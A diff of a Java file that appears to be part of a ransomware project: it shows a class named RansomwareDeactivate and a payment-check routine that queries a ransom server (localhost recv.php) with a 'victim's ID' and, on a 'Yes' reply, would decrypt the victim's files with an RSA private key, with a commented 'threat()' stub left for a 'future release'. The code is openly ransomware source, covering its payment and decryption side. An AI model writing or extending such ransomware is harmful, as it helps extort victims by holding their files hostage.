@@ -1,34 +1,25 @@
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.FileReader;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.io.InputStreamReader;
-import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
-import java.security.Key;
 import java.security.KeyFactory;
 import java.security.KeyPair;
 import java.security.KeyPairGenerator;
 import java.security.NoSuchAlgorithmException;
 import java.security.PrivateKey;
-import java.security.PublicKey;
 import java.security.spec.PKCS8EncodedKeySpec;
 import java.util.ArrayList;
 import java.util.Base64;
 import java.util.List;
 import java.util.stream.Stream;
-import java.nio.file.*;
 import javax.crypto.Cipher;
-import javax.crypto.spec.SecretKeySpec;
-import javax.management.RuntimeErrorException;
 import java.security.spec.InvalidKeySpecException;
 
 class secret {
@@ -84,9 +75,9 @@ class RansomwareDeactivate{
 	}		
 }
 
-public class project {
-	private String[] result;
-	void activate() throws IOException{
+class decrypt {
+	static private String[] result;
+	static void activate() throws IOException{
 		String privKey = result[1].replaceAll("-","").replaceAll("BEGIN PRIVATE KEY","").replaceAll("END PRIVATE KEY","");
 		byte[] privateBytes = Base64.getDecoder().decode(privKey);
 		PKCS8EncodedKeySpec keySpec = new PKCS8EncodedKeySpec(privateBytes);
@@ -105,7 +96,7 @@ public class project {
 	//void threat(){		
 	//}
 
-	void validatePayment(){
+	static void validatePayment() throws IOException{
 		//ID is the victim's ID
 		int id = 1;
 		URL obj = new URL("http://127.0.0.1/recv.php?decrypt="+id);
@@ -120,13 +111,18 @@ public class project {
 		}
 		in.close();
 		String ans  =response.toString();
-		result = ans.split("s@",2);
-		if(result[0]=="Yes" && result[1] != null){
-			activate();
+		result = ans.split("@",2);
+		System.out.println(result[0]);
+		if(result[0] == "Yes"){
+			//activate();
+			System.out.println("Decrypting files!");
 		}
 		//Implement in future release
 		//else{
 		//	threat();
 		//}
+	}
+	public static void main(String[] args) throws IOException{
+		validatePayment();
 	}
 }
